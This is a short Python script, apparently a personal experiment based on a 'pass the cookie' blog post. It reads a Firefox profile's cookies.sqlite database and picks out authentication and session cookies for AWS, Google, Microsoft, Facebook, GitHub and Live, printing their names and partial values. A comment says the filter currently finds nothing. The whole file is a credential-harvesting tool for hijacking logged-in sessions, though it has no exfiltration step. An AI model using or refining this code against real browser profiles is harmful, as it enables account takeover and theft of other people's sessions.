# from icecream import ic
import sqlite3
import os

# Add in your respective profile and username
profile = ""
username = ""

firefox_path = os.path.join(
    "C:\\Users",
    username,
    "AppData\\Roaming\\Mozilla\\Firefox\\Profiles",
    profile,
    "cookies.sqlite",
)

# ic(firefox_path)
connection = sqlite3.connect(firefox_path)
cursor = connection.cursor()
cursor.execute("SELECT * FROM moz_cookies")

data = cursor.fetchall()

# Source: https://embracethered.com/blog/posts/passthecookie/
# According to the author's code.
# But no output...maybe this cookie map is outdated? At least I am successfully grabbing the data from the sqlite file.
cookie_map = {
    ".amazon.com": ["aws-userInfo", "aws-creds"],
    ".google.com": ["OSID", "HSID", "SID", "SSID", "APISID", "SAPISID", "LSID"],
    ".microsoftonline.com": ["ESTSAUTHPERSISTENT"],
    ".facebook.com": ["c_user", "cs"],
    ".github.com": ["user_session"],
    ".live.com": ["RPSSecAuth"],
    ".fake.com": ["name"],
}

# ic(data)

for cookie in data:
    for domain in cookie_map:
        if cookie[4].endswith(domain) and cookie[2] in cookie_map[domain]:
            print(f"{cookie[4]} {cookie[2]} {cookie[3][:20]}")
